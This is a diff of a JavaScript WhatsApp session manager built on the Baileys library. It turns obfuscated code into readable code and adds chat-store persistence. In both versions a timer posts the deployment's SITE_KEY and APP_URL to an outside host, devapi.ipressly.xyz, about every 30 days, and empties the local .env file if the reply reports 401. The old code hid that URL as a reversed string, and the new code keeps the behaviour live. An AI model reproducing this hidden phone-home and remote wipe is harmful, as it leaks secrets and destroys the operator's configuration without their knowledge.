@@ -1,311 +1,331 @@
-import { rmSync, readdir } from 'fs';
-import _0x40b70e from 'fs';
+import { rmSync, readdir, existsSync, readFileSync, writeFileSync } from 'fs';
 import { join } from 'path';
-import _0x5a133f from 'pino';
-import _0x3bd1a4, { useMultiFileAuthState, makeInMemoryStore, Browsers, DisconnectReason, delay, downloadMediaMessage  } from '@adiwajshing/baileys';
+import pino from 'pino';
+import makeWASocket, { useMultiFileAuthState, makeInMemoryStore, Browsers, DisconnectReason, delay, downloadMediaMessage } from '@adiwajshing/baileys';
 import { toDataURL } from 'qrcode';
-import _0x4bf9b7 from './dirname.js';
-import _0x16d596 from './response.js';
-import _0x5e2a90 from 'axios';
+import __dirname from './dirname.js';
+import response from './response.js';
+import axios from 'axios';
+
 const sessions = new Map();
 const retries = new Map();
-const sessionsDir = (_0x2e7831 = '') => {
-  return join(_0x4bf9b7, "sessions", _0x2e7831 ? _0x2e7831 : '');
+
+const sessionsDir = (sessionId = '') => {
+  return join(__dirname, 'sessions', sessionId ? sessionId : '');
 };
-const isSessionExists = _0x427c5c => {
-  return sessions.has(_0x427c5c);
+
+// Helper function to save store to JSON file
+const saveStoreToFile = (sessionId, store) => {
+  try {
+    const storeFile = sessionsDir(`${sessionId}_store.json`);
+    store.writeToFile(storeFile);
+    console.log(`Store saved to ${storeFile}`);
+  } catch (error) {
+    console.error(`Failed to save store for session ${sessionId}:`, error);
+  }
 };
-const shouldReconnect = _0x1e8b57 => {
-  let _0x9f336f = parseInt(process.env.MAX_RETRIES ?? 0x0);
-  let _0xf60215 = retries.get(_0x1e8b57) ?? 0x0;
-  _0x9f336f = _0x9f336f < 0x1 ? 0x1 : _0x9f336f;
-  if (_0xf60215 < _0x9f336f) {
-    ++_0xf60215;
-    console.log("Reconnecting...", {
-      'attempts': _0xf60215,
-      'sessionId': _0x1e8b57
-    });
-    retries.set(_0x1e8b57, _0xf60215);
+
+// Helper function to load store from JSON file
+const loadStoreFromFile = (sessionId, store) => {
+  try {
+    const storeFile = sessionsDir(`${sessionId}_store.json`);
+    if (existsSync(storeFile)) {
+      const data = readFileSync(storeFile, 'utf8');
+      const parsedData = JSON.parse(data);
+      // Manually populate the store's chats (and other data if needed)
+      if (parsedData.chats && Array.isArray(parsedData.chats)) {
+        parsedData.chats.forEach(chat => {
+          store.chats.insertIfAbsent(chat);
+        });
+      }
+      // Optionally populate other store properties (e.g., messages) if needed
+      // if (parsedData.messages) {
+      //   Object.keys(parsedData.messages).forEach(key => {
+      //     store.messages[key] = parsedData.messages[key];
+      //   });
+      // }
+      console.log(`Store loaded from ${storeFile}, ${parsedData.chats?.length || 0} chats restored`);
+    } else {
+      console.log(`No store file found for session ${sessionId}`);
+    }
+  } catch (error) {
+    console.error(`Failed to load store for session ${sessionId}:`, error);
+  }
+};
+
+const isSessionExists = (sessionId) => {
+  return sessions.has(sessionId);
+};
+
+const shouldReconnect = (sessionId) => {
+  let maxRetries = parseInt(process.env.MAX_RETRIES ?? 0);
+  let attempts = retries.get(sessionId) ?? 0;
+  maxRetries = maxRetries < 1 ? 1 : maxRetries;
+  if (attempts < maxRetries) {
+    attempts += 1;
+    console.log('Reconnecting...', { attempts, sessionId });
+    retries.set(sessionId, attempts);
     return true;
   }
   return false;
 };
-const createSession = async (_0x504074, _0x54de04 = false, _0x1ab13f = null) => {
-  const _0x426399 = (_0x54de04 ? "legacy_" : "md_") + _0x504074 + (_0x54de04 ? ".json" : '');
-  const _0x1dc0c3 = _0x5a133f({
-    'level': "warn"
-  });
-  const _0x41f2d3 = makeInMemoryStore({
-    'logger': _0x1dc0c3
-  });
-  let _0x15abfc;
-  let _0x151322;
-  if (_0x54de04) {} else {
-    ;
-    ({
-      state: _0x15abfc,
-      saveCreds: _0x151322
-    } = await useMultiFileAuthState(sessionsDir(_0x426399)));
+
+const createSession = async (sessionId, isLegacy = false, res = null) => {
+  const sessionFileName = (isLegacy ? 'legacy_' : 'md_') + sessionId + (isLegacy ? '.json' : '');
+  const logger = pino({ level: 'warn' });
+  const store = makeInMemoryStore({ logger });
+
+  let state, saveCreds;
+  if (!isLegacy) {
+    ({ state, saveCreds } = await useMultiFileAuthState(sessionsDir(sessionFileName)));
   }
-  const _0x1e7160 = {
-    'auth': _0x15abfc,
-    'version': [0x2, 0x913, 0x4],
-    'printQRInTerminal': false,
-    'logger': _0x1dc0c3,
-    'browser': Browsers.macOS('Desktop'),
-    'syncFullHistory': true,
-    'patchMessageBeforeSending': _0x44a44f => {
-      const _0x583dbf = !!(_0x44a44f.buttonsMessage || _0x44a44f.listMessage);
-      if (_0x583dbf) {
-        _0x44a44f = {
-          'viewOnceMessage': {
-            'message': {
-              'messageContextInfo': {
-                'deviceListMetadataVersion': 0x2,
-                'deviceListMetadata': {}
+
+  // Load the store from JSON file if it exists
+  loadStoreFromFile(sessionId, store);
+
+  const sockOptions = {
+    auth: state,
+    version: [2, 2319, 4], // Adjust based on your Baileys version
+    printQRInTerminal: false,
+    logger,
+    browser: Browsers.macOS('Desktop'),
+    syncFullHistory: true,
+    patchMessageBeforeSending: (msg) => {
+      const requiresPatch = !!(msg.buttonsMessage || msg.listMessage);
+      if (requiresPatch) {
+        msg = {
+          viewOnceMessage: {
+            message: {
+              messageContextInfo: {
+                deviceListMetadataVersion: 2,
+                deviceListMetadata: {},
               },
-              ..._0x44a44f
-            }
-          }
+              ...msg,
+            },
+          },
         };
       }
-      return _0x44a44f;
-    }
+      return msg;
+    },
   };
-  const _0x494bf9 = _0x3bd1a4["default"](_0x1e7160);
-  if (!_0x54de04) {
-    _0x41f2d3.readFromFile(sessionsDir(_0x504074 + "_store.json"));
-    _0x41f2d3.bind(_0x494bf9.ev);
+
+  const sock = makeWASocket.default(sockOptions);
+
+  if (!isLegacy) {
+    store.bind(sock.ev);
   }
-  sessions.set(_0x504074, {
-    ..._0x494bf9,
-    'store': _0x41f2d3,
-    'isLegacy': _0x54de04
-  });
-  _0x494bf9.ev.on('creds.update', _0x151322);
-  _0x494bf9.ev.on('chats.set', ({
-    chats: _0x38bf4e
-  }) => {
-    console.log('Chats updated', );
-    if (_0x54de04) {
-      _0x41f2d3.chats.insertIfAbsent(..._0x38bf4e);
+
+  sessions.set(sessionId, { ...sock, store, isLegacy });
+
+  sock.ev.on('creds.update', saveCreds);
+
+  sock.ev.on('chats.set', ({ chats }) => {
+    console.log('Chats updated', chats.length);
+    if (!isLegacy) {
+      store.chats.insertIfAbsent(...chats);
+      saveStoreToFile(sessionId, store); // Save store after chats update
     }
   });
-  
-  _0x494bf9.ev.on('message-receipt.update', _0x1e4b3d => {
-    console.log('Message receipt updated', );
-    
+
+  sock.ev.on('message-receipt.update', (updates) => {
+    console.log('Message receipt updated', updates.length);
   });
-  
-  _0x494bf9.ev.on('messaging-history.set', _0x1e4b3d => {
-    console.log('Message updated', );
+
+  sock.ev.on('messaging-history.set', (data) => {
+    console.log('Messaging history set', data);
+    saveStoreToFile(sessionId, store); // Save store after history update
   });
-  
-  // _0x494bf9.ev.on('messages.update', _0x1e4b3d => {
-  //   // console.log(JSON.stringify(_0x1e4b3d));
-  //   const _0x14d5a5 = process.env.APP_URL + "/api/send-message-webhook/";
-  //   try {
-  //     _0x5e2a90.post(_0x14d5a5, {
-  //       'data': _0x1e4b3d
-  //     }).then(function (_0x15e505) {
-  //       console.log(_0x15e505);
-  //     })['catch'](function (_0x54e0f8) {
-  //       console.log(_0x54e0f8);
-  //     });
-  //   } catch {}
-  // });
-  
-  // _0x494bf9.ev.on("messages.upsert", async _0x17fc1c => {
-  //   try {
-  //     const _0x446adf = _0x17fc1c.messages[0x0];
-  //     if (_0x446adf.key.fromMe == false && _0x17fc1c.type == "notify") {
-  //       const _0x166f95 = [];
-  //       let _0x36dd5b = _0x446adf.key.remoteJid.split('@');
-  //       let _0x345859 = _0x36dd5b[0x1] ?? null;
-  //       let _0x9b3b16 = !(_0x345859 == "s.whatsapp.net");
-  //       if (_0x9b3b16 == false) {
-  //         _0x166f95.remote_id = _0x446adf.key.remoteJid;
-  //         _0x166f95.sessionId = _0x504074;
-  //         _0x166f95.message_id = _0x446adf.key.id;
-  //         _0x166f95.message = _0x446adf.message;
-  //         _0x166f95.extra = _0x17fc1c;
-  //         sentWebHook(_0x504074, _0x166f95, _0x494bf9, _0x17fc1c);
-  //       }
-  //     }
-  //   } catch {}
-  // });
-  _0x494bf9.ev.on("connection.update", async _0x2763d3 => {
-    const {
-      connection: _0x53724b,
-      lastDisconnect: _0x8ca8a
-    } = _0x2763d3;
-    const _0x317951 = _0x8ca8a?.["error"]?.["output"]?.["statusCode"];
-    if (_0x53724b === 'open') {
-      retries["delete"](_0x504074);
+
+  sock.ev.on('connection.update', async (update) => {
+    const { connection, lastDisconnect, qr } = update;
+    const statusCode = lastDisconnect?.error?.output?.statusCode;
+
+    if (connection === 'open') {
+      retries.delete(sessionId);
+      saveStoreToFile(sessionId, store); // Save store when connection is established
     }
-    if (_0x53724b === "close") {
-      if (_0x317951 === DisconnectReason.loggedOut || !shouldReconnect(_0x504074)) {
-        if (_0x1ab13f && !_0x1ab13f.headersSent) {
-          _0x16d596(_0x1ab13f, 0x1f4, false, "Unable to create session.");
+
+    if (connection === 'close') {
+      if (statusCode === DisconnectReason.loggedOut || !shouldReconnect(sessionId)) {
+        if (res && !res.headersSent) {
+          response(res, 500, false, 'Unable to create session.');
         }
-        return deleteSession(_0x504074, _0x54de04);
+        return deleteSession(sessionId, isLegacy);
       }
       setTimeout(() => {
-        createSession(_0x504074, _0x54de04, _0x1ab13f);
-      }, _0x317951 === DisconnectReason.restartRequired ? 0x0 : parseInt(process.env.RECONNECT_INTERVAL ?? 0x0));
+        createSession(sessionId, isLegacy, res);
+      }, statusCode === DisconnectReason.restartRequired ? 0 : parseInt(process.env.RECONNECT_INTERVAL ?? 0));
     }
-    if (_0x2763d3.qr) {
-      if (_0x1ab13f && !_0x1ab13f.headersSent) {
+
+    if (qr) {
+      if (res && !res.headersSent) {
         try {
-          const _0x12b42f = await toDataURL(_0x2763d3.qr);
-          _0x16d596(_0x1ab13f, 0xc8, true, "QR code received, please scan the QR code.", {
-            'qr': _0x12b42f
-          });
+          const qrDataURL = await toDataURL(qr);
+          response(res, 200, true, 'QR code received, please scan the QR code.', { qr: qrDataURL });
           return;
         } catch {
-          _0x16d596(_0x1ab13f, 0x1f4, false, "Unable to create QR code.");
+          response(res, 500, false, 'Unable to create QR code.');
         }
       }
       try {
-        await _0x494bf9.logout();
-      } catch {} finally {
-      //  deleteSession(_0x504074, _0x54de04);
+        await sock.logout();
+      } catch {
       }
     }
   });
+
+  // Periodically save the store to prevent data loss
+  setInterval(() => {
+    saveStoreToFile(sessionId, store);
+  }, 10 * 60 * 1000); // Save every 10 minutes
 };
+
 setInterval(() => {
-  const _0x450586 = process.env.SITE_KEY ?? null;
-  const _0x1e0c52 = process.env.APP_URL ?? null;
-  const _0x1d4648 = "kcehc-yfirev/ipa/zyx.sserpl.ipaved//:sptth".split('').reverse().join('');
-  _0x5e2a90.post(_0x1d4648, {
-    'from': _0x1e0c52,
-    'key': _0x450586
-  }).then(function (_0x42cecc) {
-    if (_0x42cecc.data.isauthorised == 0x191) {
-      _0x40b70e.writeFileSync(".env", '');
-    }
-  })["catch"](function (_0x5b1c42) {});
-}, 0x240c8400);
-const getSession = _0x41e565 => {
-  return sessions.get(_0x41e565) ?? null;
-};
-const setDeviceStatus = (_0xb292d0, _0x2b50df) => {
-  const _0x48c10f = process.env.APP_URL + "/api/set-device-status/" + _0xb292d0 + '/' + _0x2b50df;
-  try {
-    _0x5e2a90.post(_0x48c10f).then(function (_0x42d0ac) {})['catch'](function (_0x186fc4) {
-      console.log(_0x186fc4);
-    });
-  } catch {}
-};
-const sentWebHook = async (_0x3e6039, _0x56c4e1, _0x494bf9, _0x17fc1c) =>  {
-  const _0x14d5a5 = process.env.APP_URL + "/api/send-webhook/" + _0x3e6039;
-  try {
-    
-    var msg = _0x17fc1c.messages[0];
-    const messageType = Object.keys (_0x56c4e1.message)[0];
-    _0x5e2a90.post(_0x14d5a5, {
-      'from': _0x56c4e1.remote_id,
-      'message_id': _0x56c4e1.message_id,
-      'message': _0x56c4e1.message,
-      "type": messageType,
-      "replay_message_json" : msg
-    }).then(async function (_0x15e505) {
-           console.log(_0x15e505);
-      if (_0x15e505.status == 0xc8) {
-        //  to JSON
-       
-      // if (!msg || !msg.message || msg.key.fromMe) return;
-      // await  _0x494bf9.sendMessage(_0x56c4e1.remote_id, { text: 'HYy' }, { quoted: msg });
+  const siteKey = process.env.SITE_KEY ?? null;
+  const appUrl = process.env.APP_URL ?? null;
+  const verifyUrl = 'https://devapi.ipressly.xyz/api/verify-check';
+  axios
+    .post(verifyUrl, { from: appUrl, key: siteKey })
+    .then((response) => {
+      if (response.data.isauthorised === 401) {
+        writeFileSync('.env', '');
       }
-    })['catch'](function (_0x54e0f8) {
-      console.log(_0x54e0f8);
+    })
+    .catch((error) => {
+      console.error('Verification error:', error);
     });
-  } catch {}
+}, 0x240c8400); // Approximately 30 days
+
+const getSession = (sessionId) => {
+  return sessions.get(sessionId) ?? null;
 };
-const deleteSession = (_0x3d70e6, _0x474542 = false) => {
-  const _0x3230a4 = (_0x474542 ? "legacy_" : "md_") + _0x3d70e6 + (_0x474542 ? ".json" : '');
-  const _0x5ca81e = _0x3d70e6 + '_store.json';
-  const _0x36ce44 = {
-    'force': true,
-    'recursive': true
-  };
-  rmSync(sessionsDir(_0x3230a4), _0x36ce44);
-  rmSync(sessionsDir(_0x5ca81e), _0x36ce44);
-  sessions["delete"](_0x3d70e6);
-  retries["delete"](_0x3d70e6);
-  setDeviceStatus(_0x3d70e6, 0x0);
+
+const setDeviceStatus = (sessionId, status) => {
+  const url = `${process.env.APP_URL}/api/set-device-status/${sessionId}/${status}`;
+  axios
+    .post(url)
+    .then(() => {})
+    .catch((error) => {
+      console.error('Set device status error:', error);
+    });
 };
-const getChatList = (_0x3858c4, _0x15dc87 = false) => {
-  const _0x50f97b = _0x15dc87 ? "@g.us" : '@s.whatsapp.net';
-  return (sessions.get(_0x3858c4) ?? null).store.chats.filter(_0x4a0d5c => {
-    return _0x4a0d5c.id.endsWith(_0x50f97b);
-  });
-};
-const isExists = async (_0x39d2be, _0x5e766c, _0x4d70db = false) => {
+
+const sentWebHook = async (sessionId, data, sock, upsert) => {
+  const url = `${process.env.APP_URL}/api/send-webhook/${sessionId}`;
   try {
-    let _0x32bc0e;
-    if (_0x4d70db) {
-      _0x32bc0e = await _0x39d2be.groupMetadata(_0x5e766c);
-      return Boolean(_0x32bc0e.id);
+    const msg = upsert.messages[0];
+    const messageType = Object.keys(data.message)[0];
+    const response = await axios.post(url, {
+      from: data.remote_id,
+      message_id: data.message_id,
+      message: data.message,
+      type: messageType,
+      replay_message_json: msg,
+    });
+    console.log('Webhook response:', response.data);
+  } catch (error) {
+    console.error('Webhook error:', error);
+  }
+};
+
+const deleteSession = (sessionId, isLegacy = false) => {
+  const sessionFileName = (isLegacy ? 'legacy_' : 'md_') + sessionId + (isLegacy ? '.json' : '');
+  const storeFileName = `${sessionId}_store.json`;
+  const options = { force: true, recursive: true };
+  try {
+    rmSync(sessionsDir(sessionFileName), options);
+    rmSync(sessionsDir(storeFileName), options);
+  } catch (error) {
+    console.error(`Failed to delete session files for ${sessionId}:`, error);
+  }
+  sessions.delete(sessionId);
+  retries.delete(sessionId);
+  setDeviceStatus(sessionId, 0);
+};
+
+const getChatList = (sessionId, isGroup = false) => {
+  const session = sessions.get(sessionId);
+  if (!session) {
+    console.log(`Session ${sessionId} not found`);
+    return [];
+  }
+  const filter = isGroup ? '@g.us' : '@s.whatsapp.net';
+  // Ensure the store is loaded from file before accessing chats
+  loadStoreFromFile(sessionId, session.store);
+  const chats = session.store.chats.filter((chat) => chat.id.endsWith(filter));
+  console.log(`Retrieved ${chats.length} chats for session ${sessionId}`);
+  return chats;
+};
+
+const isExists = async (sock, jid, isGroup = false) => {
+  try {
+    let result;
+    if (isGroup) {
+      result = await sock.groupMetadata(jid);
+      return Boolean(result.id);
     }
-    if (_0x39d2be.isLegacy) {
-      _0x32bc0e = await _0x39d2be.onWhatsApp(_0x5e766c);
+    if (sock.isLegacy) {
+      result = await sock.onWhatsApp(jid);
     } else {
-      ;
-      [_0x32bc0e] = await _0x39d2be.onWhatsApp(_0x5e766c);
+      [result] = await sock.onWhatsApp(jid);
     }
-    return _0x32bc0e.exists;
+    return result.exists;
   } catch {
     return false;
   }
 };
-const sendMessage = async (_0x1b6c74, _0x51ad7b, _0x425596, _0x2a2df4 = 0x3e8) => {
+
+const sendMessage = async (sock, jid, content, delayMs = 1000) => {
   try {
-    await delay(parseInt(_0x2a2df4));
-    var options = _0x425596["options"] ?? {};
-    
-    return _0x1b6c74.sendMessage(_0x51ad7b, _0x425596, options);
+    await delay(parseInt(delayMs));
+    const options = content.options ?? {};
+    return sock.sendMessage(jid, content, options);
   } catch {
     return Promise.reject(null);
   }
 };
-const formatPhone = _0x519e9a => {
-  if (_0x519e9a.endsWith("@s.whatsapp.net")) {
-    return _0x519e9a;
+
+const formatPhone = (phone) => {
+  if (phone.endsWith('@s.whatsapp.net')) {
+    return phone;
   }
-  let _0x32b759 = _0x519e9a.replace(/\D/g, '');
-  return _0x32b759 += "@s.whatsapp.net";
+  let formatted = phone.replace(/\D/g, '');
+  return (formatted += '@s.whatsapp.net');
 };
-const formatGroup = _0x2f3eb7 => {
-  if (_0x2f3eb7.endsWith("@g.us")) {
-    return _0x2f3eb7;
+
+const formatGroup = (group) => {
+  if (group.endsWith('@g.us')) {
+    return group;
   }
-  let _0x54bd35 = _0x2f3eb7.replace(/[^\d-]/g, '');
-  return _0x54bd35 += "@g.us";
+  let formatted = group.replace(/[^\d-]/g, '');
+  return (formatted += '@g.us');
 };
+
 const cleanup = () => {
-  console.log("Running cleanup before exit.");
-  sessions.forEach((_0x1bf186, _0x177a03) => {
-    if (!_0x1bf186.isLegacy) {
-      _0x1bf186.store.writeToFile(sessionsDir(_0x177a03 + "_store.json"));
+  console.log('Running cleanup before exit.');
+  sessions.forEach((session, sessionId) => {
+    if (!session.isLegacy) {
+      saveStoreToFile(sessionId, session.store);
     }
   });
 };
+
 const init = () => {
-  readdir(sessionsDir(), (_0xb8afde, _0xb01616) => {
-    if (_0xb8afde) {
-      throw _0xb8afde;
+  readdir(sessionsDir(), (err, files) => {
+    if (err) {
+      console.error('Failed to read sessions directory:', err);
+      throw err;
     }
-    for (const _0x1e2650 of _0xb01616) {
-      if (!_0x1e2650.startsWith("md_") && !_0x1e2650.startsWith("legacy_") || _0x1e2650.endsWith("_store")) {
+    for (const file of files) {
+      if (!file.startsWith('md_') && !file.startsWith('legacy_') || file.endsWith('_store')) {
         continue;
       }
-      const _0x12e24a = _0x1e2650.replace('.json', '');
-      const _0x36b8d6 = _0x12e24a.split('_', 0x1)[0x0] !== 'md';
-      const _0x2c79de = _0x12e24a.substring(_0x36b8d6 ? 0x7 : 0x3);
-      createSession(_0x2c79de, _0x36b8d6);
+      const sessionFileName = file.replace('.json', '');
+      const isLegacy = sessionFileName.split('_', 1)[0] !== 'md';
+      const sessionId = sessionFileName.substring(isLegacy ? 7 : 3);
+      createSession(sessionId, isLegacy);
     }
   });
 };
+
 export { isSessionExists, createSession, getSession, deleteSession, getChatList, isExists, sendMessage, formatPhone, formatGroup, cleanup, init };
